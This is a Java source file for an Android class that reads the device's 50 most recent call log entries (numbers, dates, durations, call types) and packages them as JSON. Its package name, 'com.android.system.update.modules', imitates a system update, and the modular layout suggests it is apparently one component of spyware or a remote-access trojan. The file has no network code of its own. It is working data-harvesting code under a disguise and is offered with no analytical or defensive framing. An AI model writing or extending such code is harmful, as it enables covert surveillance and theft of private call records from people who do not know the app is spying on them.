package com.android.system.update.modules;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONObject;

public class CallsModule {
    private Context context;
    
    public CallsModule(Context context) {
        this.context = context;
    }
    
    public String getCallLogs() {
        if (!checkPermission()) return "ERROR: No call log permission";
        
        try {
            JSONArray callsList = new JSONArray();
            ContentResolver cr = context.getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
            
            if (cursor != null && cursor.moveToFirst()) {
                int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                
                do {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(numberIdx));
                    call.put("date", cursor.getLong(dateIdx));
                    call.put("duration", cursor.getString(durationIdx));
                    
                    int type = cursor.getInt(typeIdx);
                    String typeStr = "UNKNOWN";
                    if (type == CallLog.Calls.INCOMING_TYPE) typeStr = "INCOMING";
                    else if (type == CallLog.Calls.OUTGOING_TYPE) typeStr = "OUTGOING";
                    else if (type == CallLog.Calls.MISSED_TYPE) typeStr = "MISSED";
                    call.put("type", typeStr);
                    
                    callsList.put(call);
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
            return callsList.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "ERROR: " + e.getMessage();
        }
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
            == PackageManager.PERMISSION_GRANTED;
    }
}